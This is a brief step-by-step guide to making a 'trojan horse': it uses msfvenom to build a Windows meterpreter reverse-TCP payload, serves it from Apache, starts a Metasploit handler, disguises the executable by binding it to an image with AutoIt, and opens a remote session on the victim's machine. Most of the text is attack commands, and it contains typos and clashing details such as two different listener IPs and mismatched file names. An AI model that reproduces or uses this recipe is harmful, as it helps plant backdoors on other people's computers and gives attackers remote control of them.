To make trojan horse,
Step 1:
Go to Kali
open terminal Sudo user
> msfvenom --payload windows/meterpreter/reverse_tcp LHOST=192.168.68.101 LPORT=8080 --format exe --out testbacklog.exe
now move the textbacklog.exe file to var>www>>html>CreateNewFolder than paste
run the apache serve
> service apache2 start
> msfconsole
> use exploit/multi/handler
> show options
> show payloads
> set PAYLOAD windows/meterpreter/reverse_tcp
> set LHOST 192.169.68.101
> SET LPORT 8080
> exploit -j -z
Now on target/windows machine

Step2:
> Browser> enter Linux's ip i.e 192.168.68.101
> Have an image on machine to trojan the Backdoor file
> Download the file TrojanHorse.txt
Step3:
> Download, AUTOIT: https://www.autoitscript.com/site/autoit/
> Install
> Run Autoit Compile script to .exe
> Paste the path of TrojanHorse.txt and Trojan image
> Convert

 Step3:
 > Now run the exe file
Step4:
> On Linux run command
> session -l
>session -1
> pwd
> whoami


Voilah machine is hacked.....
